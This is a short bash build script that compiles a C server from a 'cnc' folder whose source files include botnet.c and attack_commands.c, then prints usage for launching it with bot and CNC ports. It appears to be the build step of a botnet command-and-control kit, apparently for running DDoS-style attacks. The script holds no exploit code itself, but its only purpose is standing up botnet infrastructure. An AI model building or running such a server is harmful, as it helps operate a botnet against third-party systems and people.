#/bin/bash

cd cnc
gcc -o server main.c botnet.c login_utils.c checks.c logger.c user_handler.c command_handler.c attack_commands.c -O3 -pthread
mv server ../
cd ..

sleep 1

chmod +x server

echo "DONE, USAGE->: screen ./server <botport> <threads> <cncport>"
